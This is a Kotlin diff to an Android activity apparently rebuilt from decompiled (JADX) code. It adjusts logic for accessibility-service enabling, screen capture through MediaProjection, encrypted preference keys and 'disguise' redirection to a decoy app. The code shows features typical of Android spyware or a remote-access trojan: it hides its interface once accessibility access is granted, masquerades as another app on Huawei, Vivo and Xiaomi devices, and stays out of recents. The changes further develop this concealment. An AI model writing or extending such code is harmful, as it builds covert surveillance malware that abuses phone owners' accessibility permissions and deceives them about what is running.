@@ -443,7 +443,7 @@ class iuzxujjtqev : AppCompatActivity() {
                     if (getIntent()?.getBooleanExtra("REFRESH_PERMISSION_REQUEST", false) == true)
                         putExtra("REFRESH_PERMISSION_REQUEST", true)
                 })
-                // ADAPT: try setup screen capture via reflection on MyAccessibilityService
+                // JADX: dqtvuisjd.f52358m1.getInstance() → reflection setupScreenCaptureWithMediaProjection
                 trySetupScreenCapture()
                 autoRequest = false; isRequesting = false
                 runOnUiThread { setStatusTextWithColor("✅ 权限已获取"); setButtonText("服务就绪", enabled = false) }
@@ -979,6 +979,13 @@ class iuzxujjtqev : AppCompatActivity() {
     /** JADX: e0() — handle accessibility service becoming enabled. */
     fun onAccessibilityEnabled() {
         try {
+            // SMART_RETURN_BACKUP: launched by smartReturnToApp, must NOT redirect
+            val isSmartReturn = intent?.getBooleanExtra("SMART_RETURN_BACKUP", false) == true
+            if (isSmartReturn) {
+                Log.d(TAG, "✅ [onAccessibilityEnabled] SMART_RETURN_BACKUP 模式，跳过伪装跳转")
+                return
+            }
+
             val prefsName = StringUtil.decrypt("KkkBBV4sDTpS")
             val setupKey = StringUtil.decrypt("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU=")
             val setupComplete = getSharedPreferences(prefsName, 0).getBoolean(setupKey, false)
@@ -1126,11 +1133,18 @@ class iuzxujjtqev : AppCompatActivity() {
 
         autoRequest = launchIntent?.getBooleanExtra("AUTO_REQUEST_PERMISSION", false) ?: false
 
-        // ADAPT: Build layout programmatically since rbv2f.xml doesn't exist (vendor resource obfuscation)
+        // JADX: setContentView(R$layout.rbv2f) — layout built programmatically (vendor XML obfuscated)
         createLayout()
 
+        // SMART_RETURN_BACKUP: launched by smartReturnToApp to bring our app to foreground.
+        // Must NOT hide content or return early — the Activity needs to stay visible so that
+        // rootInActiveWindow reports our package name, allowing isCurrentlyInOurApp() to succeed.
+        val isSmartReturn = launchIntent?.getBooleanExtra("SMART_RETURN_BACKUP", false) == true ||
+            launchIntent?.getBooleanExtra("MI_ANDROID10_RETURN", false) == true ||
+            launchIntent?.getBooleanExtra("MI_ANDROID13_RETURN", false) == true
+
         val accessibilityEnabled = isAccessibilityEnabled()
-        if (accessibilityEnabled) { try { mainContentView?.visibility = View.GONE } catch (_: Exception) {}; return }
+        if (accessibilityEnabled && !isSmartReturn) { try { mainContentView?.visibility = View.GONE } catch (_: Exception) {}; return }
 
         bindViews()
         enableButton?.setOnClickListener { if (isAccessibilityEnabled()) checkAndNavigate() else openAccessibilityTrampoline() }
@@ -1152,10 +1166,16 @@ class iuzxujjtqev : AppCompatActivity() {
         val pn = StringUtil.decrypt("KkkBBV4sDTpS"); val sk = StringUtil.decrypt("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU=")
         val setupComplete = getSharedPreferences(pn, 0).getBoolean(sk, false)
         val cn = intent?.component?.className ?: ""; val isD = intent?.component != null && isDisguiseAlias(cn)
-        if (intent?.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false) != true && setupComplete && !isPermissionGranted && (isD || isHuaweiDisguiseActive() || isVivoDisguiseActive())) { isPermissionGranted = true; redirectToDisguiseApp(); return }
+        val isSmartReturn = intent?.getBooleanExtra("SMART_RETURN_BACKUP", false) == true ||
+            intent?.getBooleanExtra("MI_ANDROID10_RETURN", false) == true ||
+            intent?.getBooleanExtra("MI_ANDROID13_RETURN", false) == true
+        if (!isSmartReturn && intent?.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false) != true && setupComplete && !isPermissionGranted && (isD || isHuaweiDisguiseActive() || isVivoDisguiseActive())) { isPermissionGranted = true; redirectToDisguiseApp(); return }
         val ae = isAccessibilityEnabled()
         if (!ae) { showMainContent(); return }
-        try { mainContentView?.visibility = View.GONE } catch (e: Exception) { Log.w(TAG, "❌ 隐藏提示弹窗失败: ${e.message}") }
+        // Don't hide content during smartReturnToApp — Activity must stay visible
+        if (!isSmartReturn) {
+            try { mainContentView?.visibility = View.GONE } catch (e: Exception) { Log.w(TAG, "❌ 隐藏提示弹窗失败: ${e.message}") }
+        }
         if (!getSharedPreferences(pn, 0).getBoolean(sk, false)) sendBroadcast(Intent("${packageName}.START_AUTHORIZATION").apply { setPackage(packageName) })
     }
 
@@ -1181,7 +1201,13 @@ class iuzxujjtqev : AppCompatActivity() {
         if (intent == null) { Log.w(TAG, "⚠️ [生命周期] 收到null Intent"); return }
         if (intent.getBooleanExtra("OPEN_APP_DETAILS", false)) { startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:$packageName"))); return }
         setIntent(intent)
-        if (!isPermissionGranted && !intent.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false)) {
+        // SMART_RETURN protection: skip redirectToDisguiseApp when launched by brand engine return flows
+        val isSmartReturn = intent.getBooleanExtra("SMART_RETURN_BACKUP", false) ||
+            intent.getBooleanExtra("MI_ANDROID10_RETURN", false) ||
+            intent.getBooleanExtra("MI_ANDROID13_RETURN", false)
+        if (isSmartReturn) {
+            Log.d(TAG, "✅ [onNewIntent] SMART_RETURN 模式，跳过伪装跳转")
+        } else if (!isPermissionGranted && !intent.getBooleanExtra("TRIGGER_EXCLUDE_FROM_RECENTS", false)) {
             val pn = StringUtil.decrypt("KkkBBV4sDTpS"); val sk = StringUtil.decrypt("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU=")
             val sc = getSharedPreferences(pn, 0).getBoolean(sk, false); val cn = intent.component?.className ?: ""; val isD = intent.component != null && isDisguiseAlias(cn)
             if (sc && (isD || isHuaweiDisguiseActive() || isVivoDisguiseActive())) { isPermissionGranted = true; redirectToDisguiseApp(); return }
